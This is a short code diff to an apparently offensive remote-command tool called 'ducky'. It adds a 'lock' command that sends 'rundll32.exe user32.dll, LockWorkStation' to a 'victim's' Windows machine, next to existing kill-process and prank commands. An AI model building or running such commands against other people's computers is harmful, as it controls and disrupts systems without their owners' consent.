@@ -138,6 +138,7 @@ while not stop:
             print("ducky/killall        \"process\"    Kill all processes with this name")
             print("ducky/cdromloop      N/A          Prank the victim with a continuously ejecting cdrom drive")
             print("ducky/quackimage     N/A          Prank the victim by opening a \"you just got quacked\" image")
+            print("ducky/lock           N/A          Lock the victim's computer")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -262,6 +263,10 @@ while not stop:
         elif ducky_command[:10] == "quackimage":
             commands = []
             commands.append("start-process \"https://raw.githubusercontent.com/computer-geek64/ducky/master/quacked.jpg\"")
+            stdin = "; ".join(commands)
+        elif ducky_command[:4] == "lock":
+            commands = []
+            commands.append("rundll32.exe user32.dll, LockWorkStation")
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
